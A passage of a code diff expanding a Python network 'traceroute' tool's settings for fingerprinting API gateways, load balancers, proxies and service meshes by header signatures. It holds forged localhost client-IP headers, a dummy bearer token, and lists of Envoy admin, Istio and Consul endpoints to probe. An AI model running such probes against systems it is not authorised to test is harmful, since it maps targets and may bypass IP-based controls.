+                        f'/service/test/{markers["uuid"]}',
+                        f'/microservice/test/{markers["uuid"]}',
+                        f'/backend/test/{markers["uuid"]}',
+                        f'/upstream/test/{markers["uuid"]}',
+                        f'/{markers["uuid"]}/test',
+                        f'/health/test-{markers["uuid"]}',
+                        f'/status/test-{markers["uuid"]}',
+                        f'/ping/test-{markers["uuid"]}'
+                    ],
+                    'http_methods': ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'],
+                    'payload_sizes': [0, 100, 1024, 10240, 102400, 1048576],  # bytes
+                    'timeout_tests': [1, 5, 10, 30, 60, 120]  # seconds
                 },
                 'gateway_signatures': {
-                    'kong': ['x-kong', 'kong-'],
-                    'zuul': ['x-zuul', 'zuul-'],
-                    'ambassador': ['x-ambassador'],
-                    'istio': ['x-envoy', 'istio-'],
-                    'aws_api_gateway': ['x-amzn-requestid', 'x-amz-apigw'],
-                    'azure_apim': ['x-ms-request-id', 'apim-'],
-                    'google_cloud': ['x-goog-', 'x-cloud-']
+                    # Open Source
+                    'kong': ['x-kong', 'kong-', 'server: kong', 'x-kong-upstream-latency'],
+                    'zuul': ['x-zuul', 'zuul-', 'x-netflix-zuul'],
+                    'ambassador': ['x-ambassador', 'ambassador-', 'x-envoy-upstream-service-time'],
+                    'istio': ['x-envoy', 'istio-', 'x-envoy-upstream-service-time', 'x-b3-'],
+                    'traefik': ['x-traefik', 'traefik-', 'server: traefik'],
+                    'nginx': ['server: nginx', 'x-nginx-', 'x-upstream-'],
+                    'apache': ['server: apache', 'x-apache-'],
+                    'haproxy': ['server: haproxy', 'x-haproxy-'],
+                    'linkerd': ['x-linkerd', 'l5d-'],
+                    'consul_connect': ['x-consul-', 'connect-'],
+                    'envoy': ['x-envoy-', 'server: envoy'],
+                    
+                    # Cloud Providers
+                    'aws_api_gateway': ['x-amzn-requestid', 'x-amz-apigw', 'x-amzn-trace-id', 'x-amz-'],
+                    'aws_alb': ['x-amzn-trace-id', 'x-amzn-requestid'],
+                    'aws_cloudfront': ['x-amz-cf-id', 'x-cache', 'cloudfront'],
+                    'azure_apim': ['x-ms-request-id', 'apim-', 'x-ms-', 'ocp-apim-'],
+                    'azure_front_door': ['x-azure-ref', 'x-fd-'],
+                    'google_cloud': ['x-goog-', 'x-cloud-', 'x-gfe-'],
+                    'google_cloud_load_balancer': ['x-cloud-trace-context', 'x-goog-'],
+                    'cloudflare': ['cf-ray', 'server: cloudflare', 'cf-'],
+                    'fastly': ['x-served-by', 'x-cache', 'fastly'],
+                    'akamai': ['x-akamai-', 'akamai-'],
+                    
+                    # Enterprise
+                    'mulesoft': ['x-mule-', 'mule-'],
+                    'apigee': ['x-apigee-', 'apigee-'],
+                    'wso2': ['x-wso2-', 'wso2-'],
+                    'tibco': ['x-tibco-', 'tibco-'],
+                    'ca_api_gateway': ['x-ca-', 'layer7-'],
+                    'axway': ['x-axway-', 'axway-'],
+                    'oracle_api_platform': ['x-oracle-', 'oracle-'],
+                    'ibm_api_connect': ['x-ibm-', 'x-dp-'],
+                    'redhat_3scale': ['x-3scale-', '3scale-'],
+                    
+                    # API Management Platforms
+                    'postman': ['x-postman-', 'postman-'],
+                    'insomnia': ['x-insomnia-', 'insomnia-'],
+                    'swagger_hub': ['x-swagger-', 'swaggerhub-'],
+                    'rapid_api': ['x-rapidapi-', 'rapidapi-'],
+                    
+                    # Service Mesh
+                    'kuma': ['x-kuma-', 'kuma-'],
+                    'open_service_mesh': ['x-osm-', 'osm-'],
+                    'maesh': ['x-maesh-', 'maesh-'],
+                    
+                    # CDN/Edge
+                    'amazon_cloudfront': ['x-amz-cf-id', 'cloudfront-'],
+                    'keycdn': ['x-cache', 'keycdn'],
+                    'bunnycdn': ['x-cache', 'bunnycdn'],
+                    'maxcdn': ['x-cache', 'maxcdn']
                 },
                 'response_analysis': {
                     'json_structure': True,
+                    'xml_structure': True,
                     'error_formats': True,
-                    'cors_headers': True
-                }
+                    'cors_headers': True,
+                    'security_headers': True,
+                    'caching_headers': True,
+                    'compression_detection': True,
+                    'response_time_analysis': True,
+                    'content_encoding': ['gzip', 'deflate', 'br', 'identity'],
+                    'status_code_patterns': [200, 201, 400, 401, 403, 404, 429, 500, 502, 503, 504]
+                },
+                'advanced_detection': {
+                    'websocket_support': {
+                        'upgrade_headers': ['websocket', 'h2c'],
+                        'protocols': ['ws', 'wss']
+                    },
+                    'http2_support': True,
+                    'grpc_support': {
+                        'content_types': ['application/grpc', 'application/grpc+proto'],
+                        'headers': ['grpc-', 'te: trailers']
+                    },
+                    'circuit_breaker_patterns': [
+                        'x-circuit-breaker', 'x-fallback', 'x-timeout'
+                    ],
+                    'load_balancing_headers': [
+                        'x-upstream-addr', 'x-backend-server', 'x-served-by'
+                    ],
+                    'monitoring_headers': [
+                        'x-trace-id', 'x-span-id', 'x-request-id', 'x-correlation-id'
+                    ],
+                    'geographic_routing': [
+                        'x-geo-country', 'x-geo-region', 'x-datacenter'
+                    ]
+                },
+                'security_tests': {
+                    'ssl_termination': True,
+                    'hsts_headers': True,
+                    'csp_headers': True,
+                    'xss_protection': True,
+                    'clickjacking_protection': True,
+                    'content_sniffing_protection': True,
+                    'referrer_policy': True,
+                    'feature_policy': True
+                },
+                'performance_analysis': {
+                    'response_time_thresholds': [50, 100, 200, 500, 1000, 2000],  # ms
+                    'connection_reuse': True,
+                    'keep_alive': True,
+                    'compression_ratio': True,
+                    'cache_hit_analysis': True
+                },
+                'api_versioning_detection': {
+                    'header_versioning': ['X-API-Version', 'API-Version', 'Version'],
+                    'url_versioning': ['/v1/', '/v2/', '/v3/', '/api/v1/', '/api/v2/'],
+                    'query_versioning': ['?version=', '?v=', '?api-version='],
+                    'accept_header_versioning': ['application/vnd.api+json;version=']
+                },
+                'documentation_endpoints': [
+                    '/docs', '/swagger', '/openapi', '/api-docs', '/redoc',
+                    '/swagger-ui', '/api/docs', '/documentation', '/spec'
+                ]
             },
 
-            # Layer 5: Load Balancer Detection
+            # Layer 5: Load Balancer Detection (Versione Espansa)
             'load_balancer_detection': {
                 'priority': 5,
                 'headers': {
                     'X-LB-Test': markers['uuid'],
-                    'X-Session-Test': markers['sequence'],
-                    'Connection': 'keep-alive'
+                    'X-Forwarded-For': '127.0.0.1, 192.168.1.1',
+                    'X-Real-IP': '127.0.0.1',
+                    'X-Client-IP': '127.0.0.1',
+                    'X-Cluster-Client-IP': '127.0.0.1',
+                    'X-Original-Forwarded-For': '127.0.0.1',
+                    'X-Request-ID': markers['uuid'],
+                    'X-Correlation-ID': markers['uuid'],
+                    'User-Agent': f'LBTest/1.0 ({markers["uuid"]})',
+                    'Connection': 'keep-alive',
+                    'Accept-Encoding': 'gzip, deflate, br'
                 },
                 'lb_tests': {
-                    'session_persistence': {
-                        'cookie_tests': ['JSESSIONID', 'AWSALB', 'server-id'],
-                        'ip_hash_tests': True,
-                        'header_based_routing': ['X-User-Type', 'X-Version']
-                    },
-                    'health_checks': [
-                        f'/health?test={markers["uuid"]}',
-                        f'/lb-status?test={markers["uuid"]}',
-                        f'/haproxy?stats&test={markers["uuid"]}'
+                    'algorithms': [
+                        'round_robin', 'least_connections', 'weighted_round_robin',
+                        'ip_hash', 'consistent_hashing', 'least_response_time',
+                        'resource_based', 'geographic', 'random'
                     ],
-                    'backend_detection': {
-                        'multiple_requests': 20,
-                        'response_variation_analysis': True,
-                        'server_header_analysis': True
+                    'session_persistence': {
+                        'cookie_based': True,
+                        'ip_based': True,
+                        'header_based': True,
+                        'url_parameter_based': True
+                    },
+                    'health_checks': {
+                        'tcp_check': True,
+                        'http_check': True,
+                        'https_check': True,
+                        'custom_check': True
+                    },
+                    'failover_tests': {
+                        'active_passive': True,
+                        'active_active': True,
+                        'multi_region': True
                     }
                 },
                 'lb_signatures': {
-                    'haproxy': ['haproxy', 'x-haproxy'],
-                    'nginx': ['nginx', 'x-nginx'],
-                    'aws_alb': ['awsalb', 'x-amzn-trace-id'],
-                    'f5_bigip': ['f5-bigip', 'bigip'],
-                    'citrix': ['netscaler', 'citrix'],
-                    'traefik': ['traefik', 'x-traefik']
+                    # Cloud Load Balancers
+                    'aws_alb': ['x-amzn-trace-id', 'x-amzn-requestid', 'x-amz-cf-id'],
+                    'aws_nlb': ['x-amzn-trace-id', 'x-forwarded-proto'],
+                    'aws_elb_classic': ['x-amzn-requestid', 'x-forwarded-port'],
+                    'aws_cloudfront': ['x-amz-cf-id', 'x-amz-cf-pop', 'via: cloudfront'],
+                    'azure_load_balancer': ['x-ms-request-id', 'x-azure-ref'],
+                    'azure_application_gateway': ['x-ms-request-id', 'x-appgw-trace'],
+                    'azure_front_door': ['x-azure-ref', 'x-fd-healthprobe'],
+                    'google_cloud_lb': ['x-cloud-trace-context', 'x-goog-'],
+                    'google_http_lb': ['x-goog-trace', 'x-gfe-'],
+                    'cloudflare': ['cf-ray', 'server: cloudflare', 'cf-cache-status'],
+                    'fastly': ['x-served-by', 'x-cache', 'x-timer', 'fastly-debug-digest'],
+                    'akamai': ['x-akamai-transformed', 'x-cache-key', 'x-check-cacheable'],
+                    'keycdn': ['x-cache', 'x-edge-location', 'server: keycdn'],
+                    
+                    # Hardware/Appliance Load Balancers
+                    'f5_big_ip': ['x-wa-info', 'x-cnection', 'server: big-ip'],
+                    'citrix_netscaler': ['x-client-ip', 'ns_af', 'citrix-'],
+                    'a10_networks': ['x-a10-', 'a10-'],
+                    'barracuda': ['x-barracuda-', 'barracuda-'],
+                    'kemp': ['x-kemp-', 'kemp-'],
+                    'radware': ['x-radware-', 'radware-'],
+                    'array_networks': ['x-array-', 'array-'],
+                    
+                    # Software Load Balancers
+                    'nginx': ['server: nginx', 'x-nginx-', 'x-upstream-'],
+                    'nginx_plus': ['server: nginx', 'x-nginx-plus'],
+                    'apache_httpd': ['server: apache', 'x-apache-'],
+                    'haproxy': ['server: haproxy', 'x-haproxy-'],
+                    'traefik': ['server: traefik', 'x-traefik-'],
+                    'envoy': ['server: envoy', 'x-envoy-'],
+                    'istio_proxy': ['x-envoy-', 'istio-'],
+                    'linkerd': ['x-linkerd-', 'l5d-'],
+                    'consul_connect': ['x-consul-', 'connect-proxy'],
+                    'ambassador': ['x-ambassador-', 'x-envoy-upstream-service-time'],
+                    
+                    # # Enterprise/Commercial
+                    'vmware_nsx': ['x-nsx-', 'nsx-'],
+                    'juniper_contrail': ['x-contrail-', 'contrail-'],
+                    'cisco_ace': ['x-ace-', 'cisco-ace'],
+                    'riverbed': ['x-riverbed-', 'riverbed-'],
+                    'silver_peak': ['x-silver-peak-', 'silver-peak-'],
+                    
+                    # Service Discovery Integration
+                    'consul': ['x-consul-', 'consul-'],
+                    'etcd': ['x-etcd-', 'etcd-'],
+                    'eureka': ['x-eureka-', 'eureka-'],
+                    'zookeeper': ['x-zookeeper-', 'zk-']
+                    },
+
+                'backend_detection': {
+                    'server_identification': True,
+                    'upstream_response_time': True,
+                    'backend_server_headers': [
+                        'x-upstream-addr', 'x-backend-server', 'x-served-by',
+                        'x-upstream-response-time', 'x-upstream-status'
+                    ],
+                    'connection_info': [
+                        'x-forwarded-proto', 'x-forwarded-port', 'x-forwarded-host'
+                    ]
+                },
+                'performance_analysis': {
+                    'response_time_distribution': True,
+                    'connection_pooling': True,
+                    'keep_alive_support': True,
+                    'compression_support': ['gzip', 'deflate', 'br'],
+                    'http2_support': True,
+                    'ssl_termination': True
+                },
+                'geographic_distribution': {
+                    'edge_locations': True,
+                    'pop_detection': True,
+                    'geographic_headers': [
+                        'x-geo-country', 'x-geo-region', 'x-datacenter',
+                        'x-edge-location', 'x-pop'
+                    ]
                 }
             },
 
-            # Layer 5.5: Proxy Detection
+            # Layer 5.5: Proxy Detection (Versione Espansa)
             'proxy_detection': {
                 'priority': 5.5,
                 'headers': {
-                    'X-Forwarded-For': f'127.0.0.1,{markers["uuid"]}',
-                    'X-Real-IP': f'192.168.1.{markers["sequence"][:3]}',
-                    'X-Proxy-Test': markers['uuid']
+                    'X-Proxy-Test': markers['uuid'],
+                    'X-Forwarded-For': '127.0.0.1, 10.0.0.1',
+                    'X-Real-IP': '127.0.0.1',
+                    'X-Client-IP': '127.0.0.1',
+                    'X-Remote-Addr': '127.0.0.1',
+                    'X-Originating-IP': '127.0.0.1',
+                    'X-Request-ID': markers['uuid'],
+                    'Via': f'1.1 proxy-test-{markers["sequence"]}',
+                    'Proxy-Connection': 'keep-alive',
+                    'User-Agent': f'ProxyTest/1.0 ({markers["uuid"]})',
+                    'Accept': '*/*',
+                    'Cache-Control': 'no-cache'
+                },
+                'proxy_types': {
+                    'forward_proxy': {
+                        'transparent': True,
+                        'explicit': True,
+                        'intercepting': True
+                    },
+                    'reverse_proxy': {
+                        'caching': True,
+                        'ssl_termination': True,
+                        'compression': True,
+                        'load_balancing': True
+                    },
+                    'specialized_proxies': {
+                        'web_acceleration': True,
+                        'security_proxy': True,
+                        'content_filtering': True,
+                        'bandwidth_management': True
+                    }
+                },
+                'proxy_signatures': {
+                    # Open Source Proxies
+                    'squid': ['server: squid', 'via: squid', 'x-squid-'],
+                    'nginx': ['server: nginx', 'x-nginx-', 'x-accel-'],
+                    'apache_httpd': ['server: apache', 'x-apache-', 'x-forwarded-by'],
+                    'varnish': ['server: varnish', 'x-varnish', 'via: varnish'],
+                    'haproxy': ['server: haproxy', 'x-haproxy-'],
+                    'traefik': ['server: traefik', 'x-traefik-'],
+                    'envoy': ['server: envoy', 'x-envoy-'],
+                    'caddy': ['server: caddy', 'x-caddy-'],
+                    
+                    # Enterprise/Commercial Proxies
+                    'f5_big_ip': ['server: big-ip', 'x-wa-info'],
+                    'citrix_netscaler': ['citrix-', 'ns_af'],
+                    'bluecoat': ['bluecoat-', 'x-bluecoat-'],
+                    'websense': ['websense-', 'x-websense-'],
+                    'mcafee_web_gateway': ['mcafee-', 'x-mcafee-'],
+                    'symantec_web_security': ['symantec-', 'x-symantec-'],
+                    'checkpoint_firewall': ['checkpoint-', 'x-checkpoint-'],
+                    'fortinet_fortigate': ['fortinet-', 'x-fortinet-'],
+                    'palo_alto': ['paloalto-', 'x-pan-'],
+                    'juniper_ssl_vpn': ['juniper-', 'x-juniper-'],
+                    
+                    # Cloud Proxies/CDN
+                    'cloudflare': ['cf-ray', 'server: cloudflare'],
+                    'fastly': ['x-served-by', 'via: fastly'],
+                    'akamai': ['x-akamai-', 'akamai-ghost'],
+                    'keycdn': ['x-cache', 'server: keycdn'],
+                    'maxcdn': ['x-cache', 'maxcdn'],
+                    'bunnycdn': ['bunnycdn', 'x-cache'],
+                    'aws_cloudfront': ['x-amz-cf-id', 'via: cloudfront'],
+                    'google_cloud_cdn': ['x-goog-', 'via: http/1.1 google'],
+                    'azure_front_door': ['x-azure-ref', 'x-fd-'],
+                    
+                    # API Gateways as Reverse Proxies
+                    'kong': ['server: kong', 'x-kong-'],
+                    'zuul': ['x-zuul-', 'x-netflix-'],
+                    'ambassador': ['x-ambassador-', 'x-envoy-'],
+                    'istio': ['x-envoy-', 'istio-'],
+                    
+                    # Security Proxies
+                    'imperva': ['imperva-', 'x-iij-'],
+                    'akamai_kona': ['akamai-', 'x-akamai-config-log-detail'],
+                    'cloudflare_waf': ['cf-ray', 'cf-cache-status'],
+                    'aws_waf': ['x-amzn-waf-', 'x-amzn-requestid'],
+                    'azure_waf': ['x-ms-request-id', 'x-azure-'],
+                    
+                    # Content Delivery/Acceleration
+                    'incapsula': ['incap_ses', 'x-iij-'],
+                    'sucuri': ['x-sucuri-', 'sucuri-'],
+                    'section_io': ['section-', 'x-section-'],
+                    'keycdn': ['x-cache', 'x-edge-location'],
+                    
+                    # Monitoring/Analytics Proxies
+                    'new_relic': ['x-newrelic-', 'newrelic-'],
+                    'datadog': ['x-datadog-', 'datadog-'],
+                    'pingdom': ['pingdom-', 'x-pingdom-'],
+                    
+                    # Development/Testing Proxies
+                    'charles_proxy': ['charles-', 'x-charles-'],
+                    'fiddler': ['fiddler-', 'x-fiddler-'],
+                    'burp_suite': ['burp-', 'x-burp-'],
+                    'owasp_zap': ['zap-', 'x-zap-']
+                },
+                'proxy_behavior_analysis': {
+                    'header_modification': {
+                        'via_headers': True,
+                        'x_forwarded_headers': True,
+                        'custom_headers': True,
+                        'header_removal': True
+                    },
+                    'caching_behavior': {
+                        'cache_headers': ['x-cache', 'x-cache-status', 'age'],
+                        'cache_control': True,
+                        'etag_handling': True,
+                        'last_modified': True
+                    },
+                    'ssl_handling': {
+                        'ssl_termination': True,
+                        'ssl_passthrough': True,
+                        'certificate_details': True,
+                        'tls_version': True
+                    },
+                    'compression': {
+                        'gzip': True,
+                        'deflate': True,
+                        'brotli': True,
+                        'compression_ratio': True
+                    }
+                },
+                'security_analysis': {
+                    'waf_detection': True,
+                    'ddos_protection': True,
+                    'rate_limiting': True,
+                    'ip_filtering': True,
+                    'geo_blocking': True,
+                    'bot_protection': True,
+                    'csrf_protection': True,
+                    'xss_protection': True
+                },
+                'performance_metrics': {
+                    'response_time_analysis': True,
+                    'throughput_testing': True,
+                    'connection_reuse': True,
+                    'bandwidth_optimization': True,
+                    'latency_reduction': True
+                },
+                'protocol_support': {
+                    'http_versions': ['1.0', '1.1', '2.0', '3.0'],
+                    'websocket': True,
+                    'grpc': True,
+                    'tcp_proxy': True,
+                    'udp_proxy': True,
+                    'socks_proxy': ['4', '5']
+                },
+                'anonymity_detection': {
+                    'transparent_proxy': True,
+                    'anonymous_proxy': True,
+                    'elite_proxy': True,
+                    'distorting_proxy': True
                 }
             },
             
-            # Layer 6: Service Mesh Detection
+            # Layer 6: Service Mesh Detection (Versione Espansa)
             'service_mesh_detection': {
                 'priority': 6,
                 'headers': {
                     'X-Service-Mesh-Test': markers['uuid'],
                     'X-Trace-Test': markers['sequence'],
                     'X-B3-TraceId': markers['uuid'],
-                    'X-B3-SpanId': markers['sequence']
+                    'X-B3-SpanId': markers['sequence'],
+                    'X-B3-ParentSpanId': f'parent-{markers["sequence"]}',
+                    'X-B3-Sampled': '1',
+                    'X-B3-Flags': '1',
+                    'X-Request-ID': markers['uuid'],
+                    'X-Correlation-ID': markers['uuid'],
+                    'X-Forwarded-For': '127.0.0.1',
+                    'X-Real-IP': '127.0.0.1',
+                    'User-Agent': f'ServiceMeshTest/1.0 ({markers["uuid"]})',
+                    'Authorization': f'Bearer mesh-test-{markers["sequence"]}',
+                    'X-Mesh-Test-Header': markers['uuid'],
+                    'Baggage': f'test-key=test-value-{markers["sequence"]}',
+                    'Uber-Trace-Id': f'{markers["uuid"]}:{markers["sequence"]}:0:1'
                 },
                 'mesh_tests': {
                     'sidecar_detection': {
@@ -1659,26 +3363,358 @@ class ApplicationTraceroute:
                             f'/stats?test={markers["uuid"]}',
                             f'/config_dump?test={markers["uuid"]}',
                             f'/clusters?test={markers["uuid"]}',
-                            f'/server_info?test={markers["uuid"]}'
+                            f'/server_info?test={markers["uuid"]}',
+                            f'/listeners?test={markers["uuid"]}',
+                            f'/runtime?test={markers["uuid"]}',
+                            f'/certs?test={markers["uuid"]}',
+                            f'/memory?test={markers["uuid"]}',
+                            f'/cpuprofiler?test={markers["uuid"]}',
+                            f'/contention?test={markers["uuid"]}',
+                            f'/ready?test={markers["uuid"]}',
+                            f'/stats/prometheus?test={markers["uuid"]}',
+                            f'/hot_restart_version?test={markers["uuid"]}'
                         ],
-                        'envoy_specific': True,
-                        'istio_specific': True
+                        'envoy_specific': {
+                            'admin_port': [15000, 9901, 8001, 8080],
+                            'admin_paths': ['/admin', '/envoy-admin', '/stats', '/config_dump'],
+                            'version_detection': True,
+                            'build_info': True
+                        },
+                        'istio_specific': {
+                            'pilot_endpoints': [':15010', ':15011', ':15012'],
+                            'istiod_detection': True,
+                            'galley_detection': True,
+                            'citadel_detection': True,
+                            'mixer_detection': True  # legacy
+                        },
+                        'linkerd_specific': {
+                            'admin_port': [4191, 4190],
+                            'control_plane_ns': 'linkerd',
+                            'proxy_version': True
+                        },
+                        'consul_specific': {
+                            'connect_ca_roots': '/v1/connect/ca/roots',
+                            'connect_intentions': '/v1/connect/intentions',
+                            'agent_self': '/v1/agent/self'
+                        }
                     },
                     'mtls_detection': {
-                        'cert_headers': ['x-forwarded-client-cert'],
-                        'tls_version_tests': True
+                        'cert_headers': [
+                            'x-forwarded-client-cert', 'x-ssl-client-cert',
+                            'x-client-cert', 'ssl-client-cert'
+                        ],
+                        'tls_version_tests': ['1.2', '1.3'],
+                        'cipher_suite_detection': True,
+                        'cert_chain_validation': True,
+                        'spiffe_detection': True,
+                        'cert_rotation_detection': True
                     },
                     'traffic_policies': {
-                        'circuit_breaker_tests': True,
-                        'retry_policy_tests': True,
-                        'timeout_tests': [1, 5, 10, 30]
+                        'circuit_breaker_tests': {
+                            'max_connections': [100, 1000, 10000],
+                            'max_pending_requests': [100, 1000],
+                            'max_requests': [100, 1000, 10000],
+                            'max_retries': [3, 5, 10]
+                        },
+                        'retry_policy_tests': {
+                            'retry_attempts': [3, 5, 10],
+                            'per_try_timeout': ['1s', '5s', '10s', '30s'],
+                            'retry_on': ['5xx', 'gateway-error', 'connect-failure', 'refused-stream']
+                        },
+                        'timeout_tests': [1, 5, 10, 15, 30, 60, 120],
+                        'rate_limiting_tests': {
+                            'requests_per_second': [10, 100, 1000],
+                            'burst_size': [10, 50, 100]
+                        },
+                        'fault_injection': {
+                            'delay_injection': [100, 500, 1000, 5000],  # ms
+                            'abort_injection': [400, 500, 503, 504]  # HTTP codes
+                        }
+                    },
+                    'observability': {
+                        'tracing_systems': {
+                            'jaeger': True,
+                            'zipkin': True,
+                            'opencensus': True,
+                            'opentelemetry': True,
+                            'aws_xray': True,
+                            'datadog': True,
+                            'lightstep': True
+                        },
+                        'metrics_collection': {
+                            'prometheus': True,
+                            'statsd': True,
+                            'graphite': True,
+                            'influxdb': True
+                        },
+                        'logging_systems': {
+                            'fluentd': True,
+                            'fluent_bit': True,
+                            'logstash': True,
+                            'vector': True
+                        }
                     }
                 },
                 'mesh_signatures': {
-                    'istio_envoy': ['x-envoy', 'istio', 'x-b3-'],
-                    'linkerd': ['l5d-', 'linkerd'],
-                    'consul_connect': ['x-consul'],
-                    'traefik_mesh': ['x-traefik']
+                    # Major Service Meshes
+                    'istio_envoy': {
+                        'headers': ['x-envoy-', 'istio-', 'x-b3-'],
+                        'server_headers': ['istio-proxy', 'envoy'],
+                        'version_patterns': ['istio/', 'envoy/'],
+                        'pilot_discovery': True,
+                        'mixer_telemetry': True,
+                        'citadel_security': True
+                    },
+                    'linkerd': {
+                        'headers': ['l5d-', 'linkerd-'],
+                        'server_headers': ['linkerd-proxy'],
+                        'version_patterns': ['linkerd/'],
+                        'control_plane': True,
+                        'destination_service': True,
+                        'identity_service': True
+                    },
+                    'consul_connect': {
+                        'headers': ['x-consul-', 'connect-'],
+                        'server_headers': ['consul-connect'],
+                        'service_discovery': True,
+                        'intentions_api': True,
+                        'ca_provider': True
+                    },
+                    'traefik_mesh': {
+                        'headers': ['x-traefik-', 'traefik-mesh-'],
+                        'server_headers': ['traefik-mesh'],
+                        'control_plane': True,
+                        'proxy_mode': 'smi'
+                    },
+                    'kuma': {
+                        'headers': ['x-kuma-', 'kuma-'],
+                        'server_headers': ['kuma-dp'],
+                        'control_plane': 'kuma-cp',
+                        'data_plane': 'kuma-dp',
+                        'universal_mode': True,
+                        'kubernetes_mode': True
+                    },
+                    'open_service_mesh': {
+                        'headers': ['x-osm-', 'osm-'],
+                        'server_headers': ['osm-proxy'],
+                        'controller': 'osm-controller',
+                        'injector': 'osm-injector',
+                        'bootstrap': 'osm-bootstrap'
+                    },
+                    'cilium': {
+                        'headers': ['x-cilium-', 'cilium-'],
+                        'server_headers': ['cilium-envoy'],
+                        'hubble_relay': True,
+                        'operator': True,
+                        'cni': True
+                    },
+                    'app_mesh': {
+                        'headers': ['x-amzn-', 'x-aws-'],
+                        'server_headers': ['aws-app-mesh-proxy'],
+                        'envoy_based': True,
+                        'virtual_gateway': True,
+                        'virtual_router': True
+                    },
+                    'gloo_mesh': {
+                        'headers': ['x-gloo-', 'gloo-'],
+                        'server_headers': ['gloo-proxy'],
+                        'management_plane': True,
+                        'discovery': True,
+                        'networking': True
+                    },
+                    'maesh': {
+                        'headers': ['x-maesh-', 'maesh-'],
+                        'server_headers': ['maesh-proxy'],
+                        'controller': 'maesh-controller',
+                        'prepare': 'maesh-prepare'
+                    },
+                    'flagger': {
+                        'headers': ['x-flagger-', 'flagger-'],
+                        'canary_deployment': True,
+                        'progressive_delivery': True,
+                        'metrics_analysis': True
+                    },
+                    'anthos_service_mesh': {
+                        'headers': ['x-goog-', 'asm-'],
+                        'server_headers': ['asm-proxy'],
+                        'managed_control_plane': True,
+                        'gcp_integration': True
+                    },
+                    'service_mesh_interface': {
+                        'headers': ['x-smi-', 'smi-'],
+                        'traffic_access': True,
+                        'traffic_metrics': True,
+                        'traffic_split': True,
+                        'traffic_specs': True
+                    }
+                },
+                'proxy_detection': {
+                    # Sidecar Proxies
+                    'envoy_proxy': {
+                        'admin_interface': True,
+                        'stats_endpoint': True,
+                        'config_dump': True,
+                        'version_info': True,
+                        'cluster_manager': True
+                    },
+                    'linkerd_proxy': {
+                        'rust_based': True,
+                        'ultra_light': True,
+                        'micro_proxy': True,
+                        'tap_interface': True
+                    },
+                    'nginx_service_mesh': {
+                        'nginx_plus_based': True,
+                        'spiffe_integration': True,
+                        'opentracing': True
+                    },
+                    'haproxy_ingress': {
+                        'lua_scripts': True,
+                        'stats_interface': True,
+                        'spoe_support': True
+                    }
+                },
+                'security_features': {
+                    'identity_and_access': {
+                        'spiffe_spire': True,
+                        'service_accounts': True,
+                        'rbac_policies': True,
+                        'authorization_policies': True
+                    },
+                    'encryption': {
+                        'mtls_enforcement': True,
+                        'cert_management': True,
+                        'key_rotation': True,
+                        'ca_integration': True
+                    },
+                    'policy_enforcement': {
+                        'network_policies': True,
+                        'security_policies': True,
+                        'compliance_checks': True,
+                        'audit_logging': True
+                    }
+                },
+                'traffic_management': {
+                    'routing': {
+                        'virtual_services': True,
+                        'destination_rules': True,
+                        'gateways': True,
+                        'service_entries': True
+                    },
+                    'load_balancing': {
+                        'algorithms': ['round_robin', 'least_conn', 'random', 'passthrough'],
+                        'consistent_hash': True,
+                        'locality_aware': True,
+                        'outlier_detection': True
+                    },
+                    'resilience': {
+                        'circuit_breakers': True,
+                        'timeouts': True,
+                        'retries': True,
+                        'bulkhead_isolation': True
+                    },
+                    'canary_deployments': {
+                        'traffic_shifting': True,
+                        'header_based_routing': True,
+                        'weight_based_routing': True,
+                        'mirror_traffic': True
+                    }
+                },
+                'observability_stack': {
+                    'distributed_tracing': {
+                        'trace_sampling': True,
+                        'baggage_propagation': True,
+                        'span_tags': True,
+                        'trace_correlation': True
+                    },
+                    'metrics_collection': {
+                        'service_metrics': True,
+                        'proxy_metrics': True,
+                        'control_plane_metrics': True,
+                        'custom_metrics': True
+                    },
+                    'access_logging': {
+                        'structured_logs': True,
+                        'sampling_rates': True,
+                        'custom_formats': True,
+                        'log_shipping': True
+                    },
+                    'alerting': {
+                        'sli_slo_monitoring': True,
+                        'error_rate_alerts': True,
+                        'latency_alerts': True,
+                        'availability_alerts': True
+                    }
+                },
+                'deployment_patterns': {
+                    'sidecar_injection': {
+                        'automatic_injection': True,
+                        'manual_injection': True,
+                        'annotation_based': True,
+                        'namespace_based': True
+                    },
+                    'ingress_gateway': {
+                        'external_traffic': True,
+                        'tls_termination': True,
+                        'certificate_management': True,
+                        'rate_limiting': True
+                    },
+                    'egress_gateway': {
+                        'external_services': True,
+                        'service_entries': True,
+                        'tls_origination': True,
+                        'access_control': True
+                    },
+                    'multi_cluster': {
+                        'cross_cluster_discovery': True,
+                        'cross_cluster_communication': True,
+                        'cluster_federation': True,
+                        'failover': True
+                    }
+                },
+                'integration_detection': {
+                    'kubernetes': {
+                        'crd_support': True,
+                        'operator_pattern': True,
+                        'webhook_admission': True,
+                        'service_discovery': True
+                    },
+                    'service_discovery': {
+                        'consul': True,
+                        'eureka': True,
+                        'etcd': True,
+                        'dns_based': True
+                    },
+                    'certificate_management': {
+                        'cert_manager': True,
+                        'vault_integration': True,
+                        'external_ca': True,
+                        'self_signed': True
+                    },
+                    'monitoring_integration': {
+                        'prometheus': True,
+                        'grafana': True,
+                        'jaeger': True,
+                        'kiali': True,
+                        'datadog': True,
+                        'new_relic': True
+                    }
+                },
+                'performance_analysis': {
+                    'latency_percentiles': ['p50', 'p90', 'p95', 'p99', 'p99.9'],
+                    'throughput_metrics': True,
+                    'error_rate_tracking': True,
+                    'resource_utilization': True,
+                    'proxy_overhead': True,
+                    'control_plane_performance': True
+                },
+                'compliance_and_governance': {
+                    'policy_as_code': True,
+                    'configuration_drift': True,
+                    'security_scanning': True,
+                    'compliance_reporting': True,
+                    'audit_trails': True,
+                    'change_management': True
                 }
             },
 
@@ -1730,8 +3766,8 @@ class ApplicationTraceroute:
                 'headers': {
                     'X-Runtime-Test': markers['uuid'],
                     'X-Framework-Test': markers['sequence'],
-                    'X-Language-Test': markers['timestamp']
-                   # 'X-Version-Test': markers['random_id']
+                    'X-Language-Test': markers['timestamp'],
+                    'X-Version-Test': markers['uuid']
                 },
                 'runtime_tests': {
                     'language_detection': {
@@ -2066,7 +4102,7 @@ class ApplicationTraceroute:
                     'X-Database-Test': markers['uuid'],
                     'X-Storage-Test': markers['sequence'],
                     'X-Cache-Test': markers['timestamp'],
-                   # 'X-Analytics-Test': markers['random_id']
+                    'X-Analytics-Test': markers['uuid']
                 },
                 'db_tests': {
                     'relational_databases': {
@@ -2645,8 +4681,8 @@ class ApplicationTraceroute:
         if detected_backend:
             self.log_discovery("Backend", "Detection", detected_backend)
             self.chain_map['layers'].append(f"Backend-{detected_backend}")
-        else:
